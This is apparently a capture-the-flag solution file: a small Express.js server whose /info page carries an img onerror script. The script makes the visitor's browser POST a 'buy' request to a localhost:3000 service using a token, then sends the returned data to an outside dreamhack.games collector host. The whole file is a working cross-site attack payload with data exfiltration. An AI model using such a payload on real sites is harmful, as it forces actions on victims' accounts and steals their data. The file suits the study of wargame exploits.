const express = require('express');
const app = express();

app.get('/info', (req, res) => {
    res.send(`
    <img src='' onerror='
    fetch("http://localhost:3000/4/buy", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "token": token
        }
    })
    .then(response => response.json())
    .then(data => {
        fetch("https://qdqrhnf.request.dreamhack.games/"+data.data)
    })
    '>
    `);
});

app.listen(4000);